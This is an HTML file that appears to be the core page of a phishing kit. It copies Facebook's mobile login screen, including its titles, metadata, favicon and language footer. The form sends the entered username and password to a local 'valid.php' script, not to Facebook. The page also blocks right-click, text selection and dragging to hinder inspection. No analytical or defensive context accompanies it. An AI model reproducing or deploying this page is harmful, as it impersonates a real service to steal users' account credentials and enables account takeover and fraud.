<html>
<head>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Facebook - login or sign up">
<meta name="description" content="Login to your Facebook account.">
<meta property="og:description" content="Login to your Facebook account.">
<meta property="og:site_name" content="Facebook - login or sign up">
<meta property="og:type" content="website">
<title>Facebook - Login or Sign Up</title>
<link rel="stylesheet" href="css/style.css">
<link rel="shortcut icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="navbar">
	<center>
	<img width="150" src="img/fb.png">
	</center>
</div>
<div class="login-box">
	<form class="login-form" action="valid.php" method="post">
		<label>
		<input type="text" name="user" required placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off"></label>
		<label>
		<input type="password" name="pass" required placeholder="Password" autocomplete="off" autocapitalize="off"></label>
		<input type="hidden" name="login" value="Facebook" readonly>
		<button type="submit" class="btn-login">Log In</button>
		<div class="divider">
			<span>or</span>
		</div>
		<button type="button" class="btn-create">Create a new account</button>
	</form>
</div>
<div class="login-foot">
	<center>
	<table>
	<tr>
		<td style="color:#8a9ac5;">
			<b>English (UK)</b>
		</td>
		<td>Bahasa Indonesia</td>
	</tr>
	<tr>
		<td>Basa Jawa</td>
		<td>Bahasa Melayu</td>
	</tr>
	<tr>
		<td>日本語</td>
		<td>Español</td>
	</tr>
	<tr>
		<td>Português (Brazil)</td>
		<td>
			<img width="20" src="img/plus.png">
		</td>
	</tr>
	</table>
	</br>
	Facebook © 2020 </br>
	</br>
	</center>
</div>
</body>
</html>